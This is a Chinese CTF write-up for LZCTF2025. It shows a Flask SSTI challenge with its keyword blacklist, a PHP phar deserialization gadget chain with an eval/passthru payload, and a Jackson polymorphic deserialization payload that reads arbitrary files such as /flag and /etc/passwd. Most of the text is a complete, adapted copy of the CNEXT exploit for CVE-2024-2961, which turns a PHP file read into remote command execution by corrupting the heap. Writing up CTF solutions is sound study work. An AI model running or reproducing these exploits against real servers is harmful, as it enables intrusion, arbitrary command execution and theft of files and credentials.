---
title: "LZCTF2025"
description: "如果没有命中黑名单，则使用 rendertemplatestring 渲染该输入，使用 html.unescape 解码任何 HTML 实体."
publishDate: "2025-07-19T10:23:39+08:00"
categories: ["CTF"]
tags: ["lzctf"]
---
## XX二把嗦 :

```xml
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)

BLACKLIST = [
    'init','globals','builtins','import','os','popen','read','request','application','TemplateReference',
    'cycler','joiner','namespace','lipsum','getitem','config','for','eval','flashed','range','class','mro',
    'subclasses','pyfile','shell','stdout','base','if','module','RUNCMD','format','args','values','form',
    'cookies','headers','pragma','mimetype','origin','referrer','pop','attr','chr','free','palestine','with'
]

BLACKLIST += ['0','1','2','3','4','5','6','7','8','9']

BLACKLIST += ["'",'"',"`",'\\','/','.','_','[',']','{{','}}','#']

@app.route("/", methods=["GET", "POST"])
def home():
    c = request.form.get('c') if request.method == 'POST' else None
    error_message = None
    rendered_template = None
    
    if c:
        c = c.lower()
        for item in BLACKLIST:
            if item in c:
                error_message = "Invalid input detected!"
                break
        else:
            rendered_template = html.unescape(render_template_string(c))
            # can you?
            if "fr3e_p4le$t1ne&!" in rendered_template:
                try:
                    with open('flag.txt', 'r') as flag_file:
                        flag = flag_file.read()
                    return f"Flag: {flag}"
                except FileNotFoundError:
                    return "Flag file not found!"

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>大黑阔</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('/static/image.jpg');
            background-size: cover;
            background-position: center;
            font-family: 'VT323', monospace;
            color: #33FF33;
        }

        .form-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 15px 5px rgba(0, 255, 0, 0.5);
            max-width: 400px; 
            width: 100%; 
        }

        .form-container input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #33FF33;
            border-radius: 5px;
            background-color: #000;
            color: #33FF33;
            font-size: 18px;
            box-sizing: border-box; 
        }

        .form-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #33FF33;
            border: none;
            border-radius: 5px;
            color: #000;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            box-sizing: border-box; 
        }

        .form-container input[type="submit"]:hover {
            background-color: #00FF00;
        }

        .result, .error {
            margin-top: 20px;
            padding: 10px;
            border: 2px solid #33FF33;
            border-radius: 5px;
            background-color: #000;
            color: #33FF33;
            font-size: 18px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <form method="post">
            Enter template string: <input type="text" name="c">
            <input type="submit" value="Submit">
        </form>
        
        
        <div class="result">{{ rendered_template }}{{ error_message }}</div>
        
    </div>
</body>
</html>
    '''.replace("{{ error_message }}", error_message or "").replace("{{ rendered_template }}", rendered_template or "")
```

如果没有命中黑名单，则使用 `render_template_string` 渲染该输入，使用 `html.unescape` 解码任何 HTML 实体.

### 解题方法：

fengjing一把梭哈

## 文件上传:

http://43.129.244.231:33673/show.php?file=show.php

读文件

```bash
<?php
class sing{
    public $apple;
    public $range;
    public function __destruct()
    {
        if($this->range == "range"){
            echo "apple is ?".$this->apple;
        }
    }
}

class song{
    public $banana;
    public $abble;
    public function __toString()
    {
        if($this->abble == "abble"){
            return $this->banana->ernb();
        }
    }
}

class rap{
    public $text;
    public function __call($name, $arguments)
    {
        return $this->text->aaabbb;
    }
}

class basketball{
    public $payload;
    public function __get($name)
    {
        if(!preg_match("/flag|system|php|cat|eval|tac|sort|shell|%|~|\\^|\\.|\'/i", $this->payload)){
            @eval($this->payload);
        }
    }
}


if (isset($_GET['file'])) {
    $imagePath = $_GET['file'];
    if (preg_match("/(\/flag|\/fl|\/f|sort)/i", $imagePath)){
    exit();
    }
    $imageData = file_get_contents($imagePath);

    if ($imageData !== false) {

        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimeType = finfo_buffer($finfo, $imageData);
        finfo_close($finfo);

        header("Content-Type: $mimeType");
        
        echo $imageData;
        exit;
    } else {
        echo "Image cannot be read.";
    }
}
?>
```

反序列化构建

```java
<?php
class sing{
    public $apple;
    public $range="range";
    public function __construct()
    {
        $this->apple=new song();
    }
}

class song{
    public $banana;
    public $abble="abble";
    public function __construct()
    {
        $this->banana=new rap();
    }

}

class rap{
    public $text;
    public function __construct()
    {
        $this->text=new basketball();
    }
}

class basketball{
    public $payload='passthru("nc /fl*");';
    public function __get($name)
    {
        if(!preg_match("/flag|system|php|cat|eval|tac|sort|shell|%|~|\\^|\\.|\'/i", $this->payload)){
            @eval($this->payload);
        }
    }
}

$phar=new Phar("hack100.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER();?>");
$phar->setMetadata(new sing());
$phar->addFromString("text.txt","hello,phar!");
$phar->stopBuffering();
?>
```

### **PHAR 文件创建部分**

1. **`$phar=new Phar("hack100.phar");`**:
   1. 创建一个新的 PHAR 文件，命名为 `hack100.phar`。
2. **`$phar->startBuffering();`**:
   1. 开始缓冲 PHAR 文件内容，这样可以在文件完全构建完成之前进行多个操作。
3. **`$phar->setStub("GIF89a<?php __HALT_COMPILER();?>");`**:
   1. 设置 PHAR 文件的存根（stub），在这里它使用了 GIF 文件头（`GIF89a`）和一个 PHP 代码来停止编译。这个步骤是为了确保 PHAR 文件可以被当作 PHP 文件来执行。
4. **`$phar->setMetadata(new sing());`**:
   1. 设置 PHAR 文件的元数据，这里将 `sing` 类的实例作为元数据存储在 PHAR 文件中。
5. **`$phar->addFromString("text.txt","hello,phar!");`**:
   1. 向 PHAR 文件中添加一个文本文件 `text.txt`，内容为 `"hello,phar!"`。
6. **`$phar->stopBuffering();`**:
   1. 停止缓冲并最终写入所有内容到 PHAR 文件中。

## Easy-JAVA-Serialies  :

```typescript
package com.serialies.serialies;

import java.io.IOException;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Job {
    private String title;
    private String company;
    private double salary;
    private String resume; 
    private String resumeURI;

    public void init() throws IOException {
        if (resumeURI != null) {
            URI fileUri = URI.create(resumeURI);
            this.resume = new String(Files.readAllBytes(Paths.get(fileUri)));
        } 
    }

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title;
    }

    public String getCompany() {
        return company;
    }

    public void setCompany(String company) {
        this.company = company;
    }

    public double getSalary() {
        return salary;
    }

    public void setSalary(double salary) {
        this.salary = salary;
    }

    public String getResume() {
        return resume;
    }

    public void setResume(String resume) {
        this.resume = resume;
    }

    public String getResumeURI() {
        return resumeURI;
    }

    public void setResumeURI(String resumeURI) {
        this.resumeURI = resumeURI;
    }
}
```

### 任意文件读取漏洞（高危）

- 漏洞原因：`resumeURI`直接通过`URI.create()`转换并读取文件，攻击者可控制URI指向任意路径（如`file:///etc/passwd`）。
- 风险：读取服务器敏感文件（系统配置、密钥、数据库凭证等）。
- 复现：设置`resumeURI`为`file:///etc/passwd`，调用`init()`即可泄露文件内容。

```java
public void init() throws IOException {
    if (resumeURI != null) {
        URI fileUri = URI.create(resumeURI);  // 将字符串转为URI对象
        this.resume = new String(Files.readAllBytes(Paths.get(fileUri)));  // 读取文件内容
    } 
}
```

- 功能：根据`resumeURI`加载简历文件内容到`resume`属性
- 执行逻辑：
  - 检查`resumeURI`是否非空
  - 将URI字符串转换为URI对象
  - 使用NIO的`Files.readAllBytes()`读取文件所有字节
  - 将字节数组转为字符串存入`resume`
- 异常：可能抛出`IOException`（文件不存在/读取错误）

攻击思路：

1. 利用Jackson的多态反序列化功能和`Job`类的文件读取功能来读取flag
2. 创建一个包含特殊构造的`Job`对象的`Person`实例，其`resumeURI`指向flag文件

具体步骤：

1. 向`/api/person` POST端点发送一个JSON请求，使用如下payload:

```json
{
  "@class": "com.serialies.serialies.Person",
  "name": "test",
  "age": 25,
  "address": {
    "@class": "com.serialies.serialies.Address",
    "street": "test",
    "city": "test",
    "state": "test",
    "zipCode": "test"
  },
  "job": {
    "@class": "com.serialies.serialies.Job",
    "title": "Hacker",
    "company": "CTF",
    "salary": 0,
    "resumeURI": "file:///flag"
  }
}
```

## 一起看看文件吧:

### 黑客酒吧（bilibili）

CVE-2024-2961，参考https://xz.aliyun.com/news/14986修改exp

~~~python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        data = {
            "url": path,  # 漏洞参数
            "format": "auto",
            "quality": "medium",
            "cache": "on"
        }
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file."""
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        
        # 使用正则表达式提取text-content中的内容
        pattern = r'<div class="text-content">(.*?)</div>'
        match = re.search(pattern.encode(), response.content, re.DOTALL)
        
        if not match:
            # 尝试更宽松的匹配模式
            pattern = r'text-content">(.*?)</div>'
            match = re.search(pattern.encode(), response.content, re.DOTALL)
            if not match:
                raise ValueError("Failed to extract text-content from response")

        # 提取内容并去除首尾空白字符
        data = match.group(1).strip()
        import base64
        return base64.b64decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
~~~


